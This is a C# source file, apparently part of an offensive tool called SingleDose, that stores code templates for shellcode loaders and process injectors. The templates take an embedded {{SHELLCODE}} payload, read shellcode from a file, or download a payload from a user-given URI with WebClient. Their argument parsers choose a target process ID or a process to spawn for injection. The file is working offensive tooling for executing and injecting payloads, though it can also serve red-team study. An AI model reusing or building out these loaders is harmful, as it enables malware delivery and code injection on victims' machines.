namespace SingleDose.Techniques
{
    internal class Common
    {
        public static string Static = @"System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
            {{SHELLCODE}}
            byte[] payload = payloadList.ToArray();";

        #region Loaders
        public static string LoaderDynamic = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)){
                Console.WriteLine(""-Bin: Path to shellcode"");
                Environment.Exit(0);
            }
            ArgValues parsedArgs = ArgParse(args);
            byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);";

        public static string LoaderDynamicArgs = @"
        public struct ArgValues
        {
            public string binPath;
        }

        static ArgValues ArgParse(string[] args)
        {
            ArgValues sArgs = new ArgValues();

            if (args.Count() != 0)
            {
                for (var i = 0; i < args.Count(); i++)
                {
                    if (args[i].ToUpper().StartsWith(""-BIN"") && args[i + 1] != null)
                    {
                        if (System.IO.File.Exists(args[i + 1]))
                        {
                            sArgs.binPath = args[i + 1];
                        }
                        else if (!System.IO.File.Exists(args[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid bin path supplied."");
                            Environment.Exit(0);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }

            return sArgs;
        }";

        public static string LoaderDownload = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)){
                Console.WriteLine(""-URI: URI to download"");
                Environment.Exit(0);
            }

            ArgValues parsedArgs = ArgParse(args);
            System.Net.WebClient wc = new System.Net.WebClient();
            System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)(0xc0 | 0x300 | 0xc00);
            byte[] payload;
            payload = wc.DownloadData(parsedArgs.DownloadURI);";

        public static string LoaderDownloadArgs = @"
        public struct ArgValues
        {
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues sArgs = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        sArgs.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }
            return sArgs;
        }";
        #endregion

        #region Injects
        public static string InjectDynamic = @"
            ArgValues parsedArgs = ArgParse(args);
            byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);";

        public static string InjectDynamicPIDArgs = @"public struct ArgValues
        {
            public int ProcessId;
            public string binPath;
        }

        static ArgValues ArgParse(string[] args)
        {
            ArgValues sArgs = new ArgValues();

            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine(""-Pid: Process Id to target"");
                Console.WriteLine(""-Bin: Path to shellcode"");
                Environment.Exit(0);
            }

            for (var i = 0; i < args.Count(); i++)
            {
                if (args[i].ToUpper().StartsWith(""-PID"") && args[i + 1] != null)
                {
                    int.TryParse(args[i + 1], out sArgs.ProcessId);
                }

                if (args[i].ToUpper().StartsWith(""-BIN"") && args[i + 1] != null)
                {
                    if (System.IO.File.Exists(args[i + 1]))
                    {
                        sArgs.binPath = args[i + 1];
                    }
                    else if (!System.IO.File.Exists(args[i + 1]))
                    {
                        Console.WriteLine(""[!] Invalid bin path supplied."");
                        Environment.Exit(0);
                    }
                }
            }

            return sArgs;
        }";

        public static string InjectDynamicSpawnArgs = @"public struct ArgValues
        {
            public string spawn;
            public string binPath;
        }

        static ArgValues ArgParse(string[] args)
        {
            ArgValues sArgs = new ArgValues();

            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-spawn"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine(""-Spawn: Process to spawn"");
                Console.WriteLine(""-Bin: Path to shellcode"");
                Environment.Exit(0);
            }

            for (var i = 0; i < args.Count(); i++)
            {
                if (args[i].ToUpper().StartsWith(""-SPAWN"") && args[i + 1] != null)
                {
                    if (System.IO.File.Exists(args[i + 1]))
                    {
                        sArgs.spawn = System.IO.Path.GetFullPath(args[i + 1]);
                    }
                    else if (!System.IO.File.Exists(args[i + 1]))
                    {
                        Console.WriteLine(""[!] Invalid spawn path supplied."");
                        Environment.Exit(0);
                    }
                }

                if (args[i].ToUpper().StartsWith(""-BIN"") && args[i + 1] != null)
                {
                    if (System.IO.File.Exists(args[i + 1]))
                    {
                        sArgs.binPath = args[i + 1];
                    }
                    else if (!System.IO.File.Exists(args[i + 1]))
                    {
                        Console.WriteLine(""[!] Invalid bin path supplied."");
                        Environment.Exit(0);
                    }
                }
            }

            return sArgs;
        }";

        public static string InjectDownload = @"ArgValues parsedArgs = ArgParse(args);
            System.Net.WebClient wc = new System.Net.WebClient();
            System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)(0xc0 | 0x300 | 0xc00);
            byte[] payload;
            payload = wc.DownloadData(parsedArgs.DownloadURI);";

        public static string InjectDownloadPIDArgs = @"
        public struct ArgValues
        {
            public int ProcessId;
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues sArgs = new ArgValues();
            
            if (arguments.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !arguments.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !arguments.Contains(""-uri"", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine(""-PID: Process Id to target"");
                Console.WriteLine(""-URI: URI to download"");
                Environment.Exit(0);
            }
            
            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        int.TryParse(arguments[i + 1], out sArgs.ProcessId);
                    }

                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        sArgs.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }
            return sArgs;
        }";

        public static string InjectDownloadSpawnArgs = @"
        public struct ArgValues
        {
            public string spawn;
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues sArgs = new ArgValues();

            if (arguments.Count() != 0)
            {
                if (arguments.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !arguments.Contains(""-spawn"", StringComparer.OrdinalIgnoreCase) || !arguments.Contains(""-uri"", StringComparer.OrdinalIgnoreCase))
                {
                    Console.WriteLine(""-SPAWN: Process to spawn"");
                    Console.WriteLine(""-URI: URI to download"");
                    Environment.Exit(0);
                }

                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-SPAWN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            sArgs.spawn = System.IO.Path.GetFullPath(arguments[i + 1]);
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid spawn path supplied."");
                            Environment.Exit(0);
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        sArgs.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }
            return sArgs;
        }";

        #endregion
    }
}
